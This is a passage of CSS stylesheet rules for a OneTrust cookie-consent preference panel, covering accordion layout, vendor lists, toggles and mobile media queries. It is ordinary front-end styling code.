        #onetrust-pc-sdk .ot-cat-header {
            width: calc(100% - 130px)
        }

        #onetrust-pc-sdk li.ot-subgrp>h5+.ot-tgl-cntr {
            padding-left: 13px
        }

        #onetrust-pc-sdk .ot-acc-grpcntr .ot-acc-grpdesc {
            margin-bottom: 5px
        }

        #onetrust-pc-sdk .ot-acc-grpcntr .ot-subgrp-cntr {
            border-top: 1px solid #d8d8d8
        }

        #onetrust-pc-sdk .ot-acc-grpcntr .ot-vlst-cntr+.ot-subgrp-cntr {
            border-top: none
        }

        #onetrust-pc-sdk .ot-acc-hdr .ot-arw-cntr+.ot-tgl-cntr,
        #onetrust-pc-sdk .ot-acc-txt h4+.ot-tgl-cntr {
            padding-left: 13px
        }

        #onetrust-pc-sdk .ot-pli-hdr~.ot-cat-item .ot-subgrp>h5,
        #onetrust-pc-sdk .ot-pli-hdr~.ot-cat-item .ot-cat-header {
            width: calc(100% - 145px)
        }

        #onetrust-pc-sdk .ot-pli-hdr~.ot-cat-item h5+.ot-tgl-cntr,
        #onetrust-pc-sdk .ot-pli-hdr~.ot-cat-item .ot-cat-header+.ot-tgl {
            padding-left: 28px
        }

        #onetrust-pc-sdk .ot-sel-all-hdr,
        #onetrust-pc-sdk .ot-sel-all-chkbox {
            display: inline-block;
            width: 100%;
            position: relative
        }

        #onetrust-pc-sdk .ot-sel-all-chkbox {
            z-index: 1
        }

        #onetrust-pc-sdk .ot-sel-all {
            margin: 0;
            position: relative;
            padding-right: 23px;
            float: right
        }

        #onetrust-pc-sdk .ot-consent-hdr,
        #onetrust-pc-sdk .ot-li-hdr {
            float: right;
            font-size: .812em;
            line-height: normal;
            text-align: center;
            word-break: break-word;
            word-wrap: break-word
        }

        #onetrust-pc-sdk .ot-li-hdr {
            max-width: 100px;
            padding-right: 10px
        }

        #onetrust-pc-sdk .ot-consent-hdr {
            max-width: 55px
        }

        #onetrust-pc-sdk #ot-selall-licntr {
            display: block;
            width: 21px;
            height: auto;
            float: right;
            position: relative;
            right: 80px
        }

        #onetrust-pc-sdk #ot-selall-licntr label {
            position: absolute
        }

        #onetrust-pc-sdk .ot-ven-ctgl {
            margin-left: 66px
        }

        #onetrust-pc-sdk .ot-ven-litgl+.ot-arw-cntr {
            margin-left: 81px
        }

        #onetrust-pc-sdk .ot-enbl-chr .ot-host-cnt .ot-tgl-cntr {
            width: auto
        }

        #onetrust-pc-sdk #ot-lst-cnt:not(.ot-host-cnt) .ot-tgl-cntr {
            width: auto;
            top: auto;
            height: 20px
        }

        #onetrust-pc-sdk #ot-lst-cnt .ot-chkbox {
            position: relative;
            display: inline-block;
            width: 20px;
            height: 20px
        }

        #onetrust-pc-sdk #ot-lst-cnt .ot-chkbox label {
            position: absolute;
            padding: 0;
            width: 20px;
            height: 20px
        }

        #onetrust-pc-sdk #ot-lst-cnt .ot-vnd-info-cntr {
            border: 1px solid #d8d8d8;
            padding: .75rem 2rem;
            padding-bottom: 0;
            width: auto;
            margin-top: .5rem
        }

        #onetrust-pc-sdk .ot-acc-grpdesc+.ot-leg-btn-container {
            padding-left: 20px;
            padding-right: 20px;
            width: calc(100% - 40px);
            margin-bottom: 5px
        }

        #onetrust-pc-sdk .ot-subgrp .ot-leg-btn-container {
            margin-bottom: 5px
        }

        #onetrust-pc-sdk #ot-ven-lst .ot-leg-btn-container {
            margin-top: 10px
        }

        #onetrust-pc-sdk .ot-leg-btn-container {
            display: inline-block;
            width: 100%;
            margin-bottom: 10px
        }

        #onetrust-pc-sdk .ot-leg-btn-container button {
            height: auto;
            padding: 6.5px 8px;
            margin-bottom: 0;
            letter-spacing: 0;
            font-size: .75em;
            line-height: normal
        }

        #onetrust-pc-sdk .ot-leg-btn-container svg {
            display: none;
            height: 14px;
            width: 14px;
            padding-right: 5px;
            vertical-align: sub
        }

        #onetrust-pc-sdk .ot-active-leg-btn {
            cursor: default;
            pointer-events: none
        }

        #onetrust-pc-sdk .ot-active-leg-btn svg {
            display: inline-block
        }

        #onetrust-pc-sdk .ot-remove-objection-handler {
            text-decoration: underline;
            padding: 0;
            font-size: .75em;
            font-weight: 600;
            line-height: 1;
            padding-left: 10px
        }

        #onetrust-pc-sdk .ot-obj-leg-btn-handler span {
            font-weight: bold;
            text-align: center;
            font-size: inherit;
            line-height: 1.5
        }

        #onetrust-pc-sdk.ot-close-btn-link #close-pc-btn-handler {
            border: none;
            height: auto;
            line-height: 1.5;
            text-decoration: underline;
            font-size: .69em;
            background: none;
            right: 15px;
            top: 15px;
            width: auto;
            font-weight: normal
        }

        #onetrust-pc-sdk .ot-pgph-link {
            font-size: .813em !important;
            margin-top: 5px;
            position: relative
        }

        #onetrust-pc-sdk .ot-pgph-link.ot-pgph-link-subgroup {
            margin-bottom: 1rem
        }

        #onetrust-pc-sdk .ot-pgph-contr {
            margin: 0 2.5rem
        }

        #onetrust-pc-sdk .ot-pgph-title {
            font-size: 1.18rem;
            margin-bottom: 2rem
        }

        #onetrust-pc-sdk .ot-pgph-desc {
            font-size: 1rem;
            font-weight: 400;
            margin-bottom: 2rem;
            line-height: 1.5rem
        }

        #onetrust-pc-sdk .ot-pgph-desc:not(:last-child):after {
            content: "";
            width: 96%;
            display: block;
            margin: 0 auto;
            padding-bottom: 2rem;
            border-bottom: 1px solid #e9e9e9
        }

        #onetrust-pc-sdk .ot-cat-header {
            float: left;
            font-weight: 600;
            font-size: .875em;
            line-height: 1.5;
            max-width: 90%;
            vertical-align: middle
        }

        #onetrust-pc-sdk .ot-vnd-item>button:focus {
            outline: #000 solid 2px
        }

        #onetrust-pc-sdk .ot-vnd-item>button {
            position: absolute;
            cursor: pointer;
            width: 100%;
            height: 100%;
            margin: 0;
            top: 0;
            left: 0;
            z-index: 1;
            max-width: none;
            border: none
        }

        #onetrust-pc-sdk .ot-vnd-item>button[aria-expanded=false]~.ot-acc-txt {
            margin-top: 0;
            max-height: 0;
            opacity: 0;
            overflow: hidden;
            width: 100%;
            transition: .25s ease-out;
            display: none
        }

        #onetrust-pc-sdk .ot-vnd-item>button[aria-expanded=true]~.ot-acc-txt {
            transition: .1s ease-in;
            margin-top: 10px;
            width: 100%;
            overflow: auto;
            display: block
        }

        #onetrust-pc-sdk .ot-vnd-item>button[aria-expanded=true]~.ot-acc-grpcntr {
            width: auto;
            margin-top: 0px;
            padding-bottom: 10px
        }

        #onetrust-pc-sdk .ot-accordion-layout.ot-cat-item {
            position: relative;
            border-radius: 2px;
            margin: 0;
            padding: 0;
            border: 1px solid #d8d8d8;
            border-top: none;
            width: calc(100% - 2px);
            float: left
        }

        #onetrust-pc-sdk .ot-accordion-layout.ot-cat-item:first-of-type {
            margin-top: 10px;
            border-top: 1px solid #d8d8d8
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-grpdesc {
            padding-left: 20px;
            padding-right: 20px;
            width: calc(100% - 40px);
            font-size: .812em;
            margin-bottom: 10px;
            margin-top: 15px
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-grpdesc>ul {
            padding-top: 10px
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-grpdesc>ul li {
            padding-top: 0;
            line-height: 1.5;
            padding-bottom: 10px
        }

        #onetrust-pc-sdk .ot-accordion-layout div+.ot-acc-grpdesc {
            margin-top: 5px
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-vlst-cntr:first-child {
            margin-top: 10px
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-vlst-cntr:last-child,
        #onetrust-pc-sdk .ot-accordion-layout .ot-hlst-cntr:last-child {
            margin-bottom: 5px
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-hdr {
            padding-top: 11.5px;
            padding-bottom: 11.5px;
            padding-left: 20px;
            padding-right: 20px;
            width: calc(100% - 40px);
            display: inline-block
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-txt {
            width: 100%;
            padding: 0
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-subgrp-cntr {
            padding-left: 20px;
            padding-right: 15px;
            padding-bottom: 0;
            width: calc(100% - 35px)
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-subgrp {
            padding-right: 5px
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-grpcntr {
            z-index: 1;
            position: relative
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-cat-header+.ot-arw-cntr {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            right: 20px;
            margin-top: -2px
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-cat-header+.ot-arw-cntr .ot-arw {
            width: 15px;
            height: 20px;
            margin-left: 5px;
            color: dimgray
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-cat-header {
            float: none;
            color: #2e3644;
            margin: 0;
            display: inline-block;
            height: auto;
            word-wrap: break-word;
            min-height: inherit
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-vlst-cntr,
        #onetrust-pc-sdk .ot-accordion-layout .ot-hlst-cntr {
            padding-left: 20px;
            width: calc(100% - 20px);
            display: inline-block;
            margin-top: 0;
            padding-bottom: 2px
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-hdr {
            position: relative;
            min-height: 25px
        }

        #onetrust-pc-sdk .ot-accordion-layout h4~.ot-tgl,
        #onetrust-pc-sdk .ot-accordion-layout h4~.ot-always-active {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            right: 20px
        }

        #onetrust-pc-sdk .ot-accordion-layout h4~.ot-tgl+.ot-tgl {
            right: 95px
        }

        #onetrust-pc-sdk .ot-accordion-layout .category-vendors-list-handler,
        #onetrust-pc-sdk .ot-accordion-layout .category-vendors-list-handler+a {
            margin-top: 5px
        }

        #onetrust-pc-sdk #ot-lst-cnt {
            margin-top: 1rem;
            max-height: calc(100% - 96px)
        }

        #onetrust-pc-sdk #ot-lst-cnt .ot-vnd-info-cntr {
            border: 1px solid #d8d8d8;
            padding: .75rem 2rem;
            padding-bottom: 0;
            width: auto;
            margin-top: .5rem
        }

        #onetrust-pc-sdk #ot-lst-cnt .ot-vnd-info {
            margin-bottom: 1rem;
            padding-left: .75rem;
            padding-right: .75rem;
            display: flex;
            flex-direction: column
        }

        #onetrust-pc-sdk #ot-lst-cnt .ot-vnd-info[data-vnd-info-key*=DPOEmail] {
            border-top: 1px solid #d8d8d8;
            padding-top: 1rem
        }

        #onetrust-pc-sdk #ot-lst-cnt .ot-vnd-info[data-vnd-info-key*=DPOLink] {
            border-bottom: 1px solid #d8d8d8;
            padding-bottom: 1rem
        }

        #onetrust-pc-sdk #ot-lst-cnt .ot-vnd-info .ot-vnd-lbl {
            font-weight: bold;
            font-size: .85em;
            margin-bottom: .5rem
        }

        #onetrust-pc-sdk #ot-lst-cnt .ot-vnd-info .ot-vnd-cnt {
            margin-left: .5rem;
            font-weight: 500;
            font-size: .85rem
        }

        #onetrust-pc-sdk .ot-vs-list,
        #onetrust-pc-sdk .ot-vnd-serv {
            width: auto;
            padding: 1rem 1.25rem;
            padding-bottom: 0
        }

        #onetrust-pc-sdk .ot-vs-list .ot-vnd-serv-hdr-cntr,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-serv-hdr-cntr {
            padding-bottom: .75rem;
            border-bottom: 1px solid #d8d8d8
        }

        #onetrust-pc-sdk .ot-vs-list .ot-vnd-serv-hdr-cntr .ot-vnd-serv-hdr,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-serv-hdr-cntr .ot-vnd-serv-hdr {
            font-weight: 600;
            font-size: .95em;
            line-height: 2;
            margin-left: .5rem
        }

        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item {
            border: none;
            margin: 0;
            padding: 0
        }

        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item button,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item button {
            outline: none;
            border-bottom: 1px solid #d8d8d8
        }

        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item button[aria-expanded=true],
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item button[aria-expanded=true] {
            border-bottom: none
        }

        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item:first-child,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item:first-child {
            margin-top: .25rem;
            border-top: unset
        }

        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item:last-child,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item:last-child {
            margin-bottom: .5rem
        }

        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item:last-child button,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item:last-child button {
            border-bottom: none
        }

        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-vnd-info-cntr,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-vnd-info-cntr {
            border: 1px solid #d8d8d8;
            padding: .75rem 1.75rem;
            padding-bottom: 0;
            width: auto;
            margin-top: .5rem
        }

        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-vnd-info,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-vnd-info {
            margin-bottom: 1rem;
            padding-left: .75rem;
            padding-right: .75rem;
            display: flex;
            flex-direction: column
        }

        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-vnd-info[data-vnd-info-key*=DPOEmail],
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-vnd-info[data-vnd-info-key*=DPOEmail] {
            border-top: 1px solid #d8d8d8;
            padding-top: 1rem
        }

        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-vnd-info[data-vnd-info-key*=DPOLink],
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-vnd-info[data-vnd-info-key*=DPOLink] {
            border-bottom: 1px solid #d8d8d8;
            padding-bottom: 1rem
        }

        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-vnd-info .ot-vnd-lbl,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-vnd-info .ot-vnd-lbl {
            font-weight: bold;
            font-size: .85em;
            margin-bottom: .5rem
        }

        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-vnd-info .ot-vnd-cnt,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-vnd-info .ot-vnd-cnt {
            margin-left: .5rem;
            font-weight: 500;
            font-size: .85rem
        }

        #onetrust-pc-sdk .ot-vs-list.ot-vnd-subgrp-cnt,
        #onetrust-pc-sdk .ot-vnd-serv.ot-vnd-subgrp-cnt {
            padding-left: 40px
        }

        #onetrust-pc-sdk .ot-vs-list.ot-vnd-subgrp-cnt .ot-vnd-serv-hdr-cntr .ot-vnd-serv-hdr,
        #onetrust-pc-sdk .ot-vnd-serv.ot-vnd-subgrp-cnt .ot-vnd-serv-hdr-cntr .ot-vnd-serv-hdr {
            font-size: .8em
        }

        #onetrust-pc-sdk .ot-vs-list.ot-vnd-subgrp-cnt .ot-cat-header,
        #onetrust-pc-sdk .ot-vnd-serv.ot-vnd-subgrp-cnt .ot-cat-header {
            font-size: .8em
        }

        #onetrust-pc-sdk .ot-subgrp-cntr .ot-vnd-serv {
            margin-bottom: 1rem;
            padding: 1rem .95rem
        }

        #onetrust-pc-sdk .ot-subgrp-cntr .ot-vnd-serv .ot-vnd-serv-hdr-cntr {
            padding-bottom: .75rem;
            border-bottom: 1px solid #d8d8d8
        }

        #onetrust-pc-sdk .ot-subgrp-cntr .ot-vnd-serv .ot-vnd-serv-hdr-cntr .ot-vnd-serv-hdr {
            font-weight: 700;
            font-size: .8em;
            line-height: 20px;
            margin-left: .82rem
        }

        #onetrust-pc-sdk .ot-subgrp-cntr .ot-cat-header {
            font-weight: 700;
            font-size: .8em;
            line-height: 20px
        }

        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-vnd-serv .ot-vnd-lst-cont .ot-accordion-layout .ot-acc-hdr div.ot-chkbox {
            margin-left: .82rem
        }

        #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr,
        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr,
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr,
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr,
        #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr,
        #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr {
            padding: .7rem 0;
            margin: 0;
            display: flex;
            width: 100%;
            align-items: center;
            justify-content: space-between
        }

        #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr div:first-child,
        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr div:first-child,
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr div:first-child,
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr div:first-child,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr div:first-child,
        #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr div:first-child,
        #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr div:first-child {
            margin-left: .5rem
        }

        #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr div:last-child,
        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr div:last-child,
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr div:last-child,
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr div:last-child,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr div:last-child,
        #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr div:last-child,
        #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr div:last-child {
            margin-right: .5rem;
            margin-left: .5rem
        }

        #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr .ot-always-active,
        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr .ot-always-active,
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr .ot-always-active,
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-always-active,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr .ot-always-active,
        #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-always-active,
        #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr .ot-always-active {
            position: relative;
            right: unset;
            top: unset;
            transform: unset
        }

        #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr .ot-plus-minus,
        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr .ot-plus-minus,
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr .ot-plus-minus,
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-plus-minus,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr .ot-plus-minus,
        #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-plus-minus,
        #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr .ot-plus-minus {
            top: 0
        }

        #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr .ot-arw-cntr,
        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr .ot-arw-cntr,
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr .ot-arw-cntr,
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-arw-cntr,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr .ot-arw-cntr,
        #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-arw-cntr,
        #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr .ot-arw-cntr {
            float: none;
            top: unset;
            right: unset;
            transform: unset;
            margin-top: -2px;
            position: relative
        }

        #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr .ot-cat-header,
        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr .ot-cat-header,
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr .ot-cat-header,
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-cat-header,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr .ot-cat-header,
        #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-cat-header,
        #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr .ot-cat-header {
            flex: 1;
            margin: 0 .5rem
        }

        #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr .ot-tgl,
        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr .ot-tgl,
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr .ot-tgl,
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-tgl,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr .ot-tgl,
        #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-tgl,
        #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr .ot-tgl {
            position: relative;
            transform: none;
            right: 0;
            top: 0;
            float: none
        }

        #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr .ot-chkbox,
        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr .ot-chkbox,
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr .ot-chkbox,
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-chkbox,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr .ot-chkbox,
        #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-chkbox,
        #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr .ot-chkbox {
            position: relative;
            margin: 0 .5rem
        }

        #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr .ot-chkbox label,
        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr .ot-chkbox label,
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr .ot-chkbox label,
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-chkbox label,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr .ot-chkbox label,
        #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-chkbox label,
        #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr .ot-chkbox label {
            padding: 0
        }

        #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr .ot-chkbox label::before,
        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr .ot-chkbox label::before,
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr .ot-chkbox label::before,
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-chkbox label::before,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr .ot-chkbox label::before,
        #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-chkbox label::before,
        #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr .ot-chkbox label::before {
            position: relative
        }

        #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr .ot-chkbox input,
        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr .ot-chkbox input,
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr .ot-chkbox input,
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-chkbox input,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr .ot-chkbox input,
        #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-chkbox input,
        #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr .ot-chkbox input {
            position: absolute;
            cursor: pointer;
            width: 100%;
            height: 100%;
            opacity: 0;
            margin: 0;
            top: 0;
            left: 0;
            z-index: 1
        }

        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps li.ot-subgrp .ot-acc-hdr h5.ot-cat-header,
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps li.ot-subgrp .ot-acc-hdr h4.ot-cat-header {
            margin: 0
        }

        #onetrust-pc-sdk .ot-vs-config .ot-subgrp-cntr ul.ot-subgrps li.ot-subgrp h5 {
            top: 0;
            line-height: 20px
        }

        #onetrust-pc-sdk .ot-vs-list {
            display: flex;
            flex-direction: column;
            padding: 0;
            margin: .5rem 4px
        }

        #onetrust-pc-sdk .ot-vs-selc-all {
            display: flex;
            padding: 0;
            float: unset;
            align-items: center;
            justify-content: flex-start
        }

        #onetrust-pc-sdk .ot-vs-selc-all.ot-toggle-conf {
            justify-content: flex-end
        }

        #onetrust-pc-sdk .ot-vs-selc-all.ot-toggle-conf.ot-caret-conf .ot-sel-all-chkbox {
            margin-right: 48px
        }

        #onetrust-pc-sdk .ot-vs-selc-all.ot-toggle-conf .ot-sel-all-chkbox {
            margin: 0;
            padding: 0;
            margin-right: 14px;
            justify-content: flex-end
        }

        #onetrust-pc-sdk .ot-vs-selc-all.ot-toggle-conf #ot-selall-vencntr.ot-chkbox,
        #onetrust-pc-sdk .ot-vs-selc-all.ot-toggle-conf #ot-selall-vencntr.ot-tgl {
            display: inline-block;
            right: unset;
            width: auto;
            height: auto;
            float: none
        }

        #onetrust-pc-sdk .ot-vs-selc-all.ot-toggle-conf #ot-selall-vencntr label {
            width: 45px;
            height: 25px
        }

        #onetrust-pc-sdk .ot-vs-selc-all .ot-sel-all-chkbox {
            margin-right: 11px;
            margin-left: .75rem;
            display: flex;
            align-items: center
        }

        #onetrust-pc-sdk .ot-vs-selc-all .sel-all-hdr {
            margin: 0 1.25rem;
            font-size: .812em;
            line-height: normal;
            text-align: center;
            word-break: break-word;
            word-wrap: break-word
        }

        #onetrust-pc-sdk .ot-vnd-list-cnt #ot-selall-vencntr.ot-chkbox {
            float: unset;
            right: 0
        }

        #onetrust-pc-sdk[dir=rtl] #ot-back-arw,
        #onetrust-pc-sdk[dir=rtl] input~.ot-acc-hdr .ot-arw {
            transform: rotate(180deg);
            -o-transform: rotate(180deg);
            -ms-transform: rotate(180deg);
            -webkit-transform: rotate(180deg)
        }

        #onetrust-pc-sdk[dir=rtl] input:checked~.ot-acc-hdr .ot-arw {
            transform: rotate(270deg);
            -o-transform: rotate(270deg);
            -ms-transform: rotate(270deg);
            -webkit-transform: rotate(270deg)
        }

        #onetrust-pc-sdk[dir=rtl] .ot-chkbox label::after {
            transform: rotate(45deg);
            -webkit-transform: rotate(45deg);
            -o-transform: rotate(45deg);
            -ms-transform: rotate(45deg);
            border-left: 0;
            border-right: 3px solid
        }

        #onetrust-pc-sdk[dir=rtl] .ot-search-cntr>svg {
            right: 0
        }

        @media only screen and (max-width: 600px) {
            #onetrust-pc-sdk.otPcCenter {
                left: 0;
                min-width: 100%;
                height: 100%;
                top: 0;
                border-radius: 0
            }

            #onetrust-pc-sdk #ot-pc-content,
            #onetrust-pc-sdk.ot-ftr-stacked .ot-btn-container {
                margin: 1px 3px 0 10px;
                padding-right: 10px;
                width: calc(100% - 23px)
            }

            #onetrust-pc-sdk .ot-btn-container button {
                max-width: none;
                letter-spacing: .01em
            }

            #onetrust-pc-sdk #close-pc-btn-handler {
                top: 10px;
                right: 17px
            }

            #onetrust-pc-sdk p {
                font-size: .7em
            }

            #onetrust-pc-sdk #ot-pc-hdr {
                margin: 10px 10px 0 5px;
                width: calc(100% - 15px)
            }

            #onetrust-pc-sdk .vendor-search-handler {
                font-size: 1em
            }

            #onetrust-pc-sdk #ot-back-arw {
                margin-left: 12px
            }

            #onetrust-pc-sdk #ot-lst-cnt {
                margin: 0;
                padding: 0 5px 0 10px;
                min-width: 95%
            }

            #onetrust-pc-sdk .switch+p {
                max-width: 80%
            }

            #onetrust-pc-sdk .ot-ftr-stacked button {
                width: 100%
            }

            #onetrust-pc-sdk #ot-fltr-cnt {
                max-width: 320px;
                width: 90%;
                border-top-right-radius: 0;
                border-bottom-right-radius: 0;
                margin: 0;
                margin-left: 15px;
                left: auto;
                right: 40px;
                top: 85px
            }

            #onetrust-pc-sdk .ot-fltr-opt {
                margin-left: 25px;
                margin-bottom: 10px
            }

            #onetrust-pc-sdk .ot-pc-refuse-all-handler {
                margin-bottom: 0
            }

            #onetrust-pc-sdk #ot-fltr-cnt {
                right: 40px
            }
        }

        @media only screen and (max-width: 476px) {

            #onetrust-pc-sdk .ot-fltr-cntr,
            #onetrust-pc-sdk #ot-fltr-cnt {
                right: 10px
            }

            #onetrust-pc-sdk #ot-anchor {
                right: 25px
            }

